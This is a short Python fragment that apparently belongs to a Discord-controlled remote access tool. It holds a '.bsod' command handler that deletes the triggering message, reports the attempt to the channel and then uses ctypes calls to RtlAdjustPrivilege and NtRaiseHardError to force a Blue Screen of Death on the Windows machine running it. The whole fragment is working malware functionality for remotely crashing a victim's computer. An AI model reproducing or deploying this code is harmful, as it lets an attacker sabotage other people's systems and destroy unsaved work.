import ctypes
# end of imports
# on message
elif message.content == '.bsod':
    #.log Message is "Blue Screen of Death" 
    await message.delete()
    #.log Removed the message 
    await message.channel.send("```Attempting to trigger a BSoD...```")
    #.log Sent message about trying to BSoD 
    #.log Trying to trigger BSoD 
    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19), 
        ctypes.c_uint(1), 
        ctypes.c_uint(0), 
        ctypes.byref(ctypes.c_int())
    )
    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B), 
        ctypes.c_ulong(0), 
        nullptr, 
        nullptr, 
        ctypes.c_uint(6),
       ctypes.byref(ctypes.c_uint())
    )
